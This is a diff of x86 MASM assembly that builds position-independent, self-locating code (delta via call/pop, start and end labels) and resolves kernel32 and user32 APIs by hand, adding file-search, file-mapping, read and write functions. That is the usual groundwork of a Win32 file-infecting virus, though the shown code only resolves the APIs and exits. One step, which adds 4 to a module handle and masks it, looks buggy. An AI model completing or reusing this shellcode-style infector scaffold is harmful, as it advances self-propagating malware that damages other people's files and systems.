@@ -4,6 +4,7 @@ option casemap:none
 
 .code
 _main proc
+start_label:
 	call start_code
 start_code:
 	pop ebx
@@ -13,10 +14,24 @@ start_code:
 	mov ebp, esp
 	sub esp, 300h			;prelog 
 	xor eax, eax
+
 	mov [ebp - 4], eax		;Base Kernel32.dll
-	mov [ebp - 8], eax		;LoadLibrary
-	mov [ebp - 12], eax		;HMODULE User32.dll
-	mov [ebp - 16], eax		;MessageBoxA
+	mov [ebp - 8], eax		;Base User32.dll
+
+	mov [ebp - 12], eax		;VA MessageBoxA
+	mov [ebp - 16], eax		;VA LoadLibraryA
+	mov [ebp - 20], eax		;VA GetProcAddress 
+	mov [ebp - 24], eax		;VA FindFirstFileA
+	mov [ebp - 28], eax		;VA FindNextFileA
+	mov [ebp - 32], eax		;VA CreateFileA
+	mov [ebp - 36], eax		;VA GetFileSize
+	mov [ebp - 40], eax		;VA CreateFileMappingA
+	mov [ebp - 44], eax		;VA MapViewOfFile
+	mov [ebp - 48], eax		;VA UnmapViewOfFile
+	mov [ebp - 52], eax		;VA SetFilePointer
+	mov [ebp - 56], eax		;VA ReadFile
+	mov [ebp - 60], eax		;VA WriteFile
+	mov [ebp - 64], eax		;VA CloseHandle
 
 	lea eax, [ebx + offset wszKernel32]
 	push eax
@@ -24,32 +39,159 @@ start_code:
 	add esp, 4
 	mov [ebp - 4], eax		;store kernel32 base
 
-	lea edx, [ebx + offset sLoadLibraryA]
-	push edx
+	lea eax, [ebx + offset sGetProcAddress]	
 	push eax
+	push [ebp - 4]
 	call GetFuncAddr
-	mov [ebp - 8], eax
-
-	lea edx, [ebx + offset sUser32]
-	push edx
-	call eax		;LoadLibraryA
-
+	add esp, 8
 	test eax, eax
 	jz Exit
+	mov [ebp - 20], eax		;VA GetProcAddress 	
 
-	mov [ebp - 12], eax	;Store HMODULE User32
-	lea edx, [ebx + offset sMessageBoxA]
-	push edx
+	lea eax, [ebx + offset sLoadLibraryA]
 	push eax
-	call GetFuncAddr
-	mov [ebp - 16], eax
+	push [ebp - 4]			;Base Kernel32.dll
+	mov eax, [ebp - 20]		;VA GetProcAddress 	
+	call eax
+	add esp, 8
+	test eax, eax
+	jz Exit
+	mov [ebp - 16], eax		;VA LoadLibraryA
 
-	push 0
-	push 0
-	push 0
-	push 0
-	call eax	;MessageBoxA
+	lea eax, [ebx + offset sUser32]
+	push eax
+	mov eax, [ebp - 16]		;VA LoadLibraryA
+	call eax
+	add eax, 4
+	test eax, eax
+	jz Exit
+	and eax, 0ffff0000h		;Clear 2 low bytes
+	mov [ebp - 8], eax		;Base User32.dll
 
+	lea eax, [ebx + offset sMessageBoxA]
+	push eax
+	mov eax, [ebp - 8]
+	push eax				;Base User32.dll
+	mov eax, [ebp - 20]		;VA GetProcAddress 	
+	call eax
+	add esp, 8
+	test eax, eax
+	jz Exit
+	mov [ebp - 12], eax		;VA MessageBoxA
+
+	lea eax, [ebx + offset sFindFirstFileA]
+	push eax
+	push [ebp - 4]			;Base Kernel32.dll
+	mov eax, [ebp - 20]		;VA GetProcAddress 	
+	call eax
+	add esp, 8
+	test eax, eax
+	jz Exit
+	mov [ebp - 24], eax		;VA FindFirstFileA
+
+	lea eax, [ebx + offset sFindNextFileA]
+	push eax
+	push [ebp - 4]			;Base Kernel32.dll
+	mov eax, [ebp - 20]		;VA GetProcAddress 	
+	call eax
+	add esp, 8
+	test eax, eax
+	jz Exit
+	mov [ebp - 28], eax		;VA FindNextFileA
+
+	lea eax, [ebx + offset sCreateFileA]
+	push eax
+	push [ebp - 4]			;Base Kernel32.dll
+	mov eax, [ebp - 20]		;VA GetProcAddress 	
+	call eax
+	add esp, 8
+	test eax, eax
+	jz Exit
+	mov [ebp - 32], eax		;VA CreateFileA
+
+	lea eax, [ebx + offset sGetFileSize]
+	push eax
+	push [ebp - 4]			;Base Kernel32.dll
+	mov eax, [ebp - 20]		;VA GetProcAddress 	
+	call eax
+	add esp, 8
+	test eax, eax
+	jz Exit
+	mov [ebp - 36], eax		;VA GetFileSize
+
+	lea eax, [ebx + offset sCreateFileMappingA]
+	push eax
+	push [ebp - 4]			;Base Kernel32.dll
+	mov eax, [ebp - 20]		;VA GetProcAddress 	
+	call eax
+	add esp, 8
+	test eax, eax
+	jz Exit
+	mov [ebp - 40], eax		;VA CreateFileMappingA
+
+	lea eax, [ebx + offset sMapViewOfFile]
+	push eax
+	push [ebp - 4]			;Base Kernel32.dll
+	mov eax, [ebp - 20]		;VA GetProcAddress 	
+	call eax
+	add esp, 8
+	test eax, eax
+	jz Exit
+	mov [ebp - 44], eax		;VA MapViewOfFile
+
+	lea eax, [ebx + offset sUnmapViewOfFile]
+	push eax
+	push [ebp - 4]			;Base Kernel32.dll
+	mov eax, [ebp - 20]		;VA GetProcAddress 	
+	call eax
+	add esp, 8
+	test eax, eax
+	jz Exit
+	mov [ebp - 48], eax		;VA UnmapViewOfFile
+
+	lea eax, [ebx + offset sSetFilePointer]
+	push eax
+	push [ebp - 4]			;Base Kernel32.dll
+	mov eax, [ebp - 20]		;VA GetProcAddress 	
+	call eax
+	add esp, 8
+	test eax, eax
+	jz Exit
+	mov [ebp - 52], eax		;VA SetFilePointer
+
+	lea eax, [ebx + offset sReadFile]
+	push eax
+	push [ebp - 4]			;Base Kernel32.dll
+	mov eax, [ebp - 20]		;VA GetProcAddress 	
+	call eax
+	add esp, 8
+	test eax, eax
+	jz Exit
+	mov [ebp - 56], eax		;VA ReadFile
+
+	lea eax, [ebx + offset sWriteFile]
+	push eax
+	push [ebp - 4]			;Base Kernel32.dll
+	mov eax, [ebp - 20]		;VA GetProcAddress 	
+	call eax
+	add esp, 8
+	test eax, eax
+	jz Exit
+	mov [ebp - 60], eax		;VA WriteFile
+
+	lea eax, [ebx + offset sCloseHandle]
+	push eax
+	push [ebp - 4]			;Base Kernel32.dll
+	mov eax, [ebp - 20]		;VA GetProcAddress 	
+	call eax
+	add esp, 8
+	test eax, eax
+	jz Exit
+	mov [ebp - 64], eax		;VA CloseHandle
+
+
+
+	xor eax, eax
 Exit:
 	mov esp, ebp
 	pop ebp
@@ -267,7 +409,21 @@ EndToLower:
 ToLower endp
 
 	wszKernel32 dw 'c',':','\','w','i','n','d','o','w','s','\','s','y','s','t','e','m','3','2','\','k','e','r','n','e','l','3','2','.', 'd','l','l', 0
+	sUser32 db "User32.dll", 0
 	sLoadLibraryA db "LoadLibraryA", 0
 	sMessageBoxA db "MessageBoxA", 0
-	sUser32 db "User32.dll", 0
+	sGetProcAddress db "GetProcAddress", 0
+	sFindFirstFileA db "FindFirstFileA", 0
+	sFindNextFileA db "FindNextFileA", 0
+	sCreateFileA db "CreateFileA", 0
+	sGetFileSize db "GetFileSize", 0
+	sCreateFileMappingA db "CreateFileMappingA", 0
+	sMapViewOfFile db "MapViewOfFile", 0
+	sUnmapViewOfFile db "UnmapViewOfFile", 0
+	sSetFilePointer db "SetFilePointer", 0
+	sReadFile db "ReadFile", 0
+	sWriteFile db "WriteFile", 0
+	sCloseHandle db "CloseHandle", 0
+
+end_label:
 end _main
